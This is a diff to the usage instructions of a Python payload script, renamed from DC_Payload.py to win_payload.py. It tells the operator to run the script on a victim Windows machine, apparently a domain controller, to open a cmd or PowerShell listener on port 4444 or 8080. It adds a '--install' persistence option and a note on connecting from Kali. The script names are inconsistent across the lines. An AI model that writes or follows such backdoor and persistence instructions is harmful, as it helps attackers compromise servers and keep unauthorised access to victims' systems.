@@ -1,14 +1,20 @@
-DC_payload.py
+win_payload.py
 
 USAGE INSTRUCTIONS (RUN ON VICTIM)
 # Default installation (Port 4444, cmd mode, ONSTART trigger)
-python DC_Payload.py
+python win_payload.py
+
+# Install Persistance
+python winpayload.py --install
 
 # PowerShell mode
-python DC_Payload.py --mode powershell
+python win_payload.py --mode powershell
 
 # Custom port (e.g. 8080)
-python DC_Payload.py --port 8080
+python win_payload.py --port 8080
+
+# On Windows Server 2019 (Standard Edition)
+python DC_Payload.py --mode powershell --install --port 8080
 
 To Connection from Kali:
 # Connect to the DC
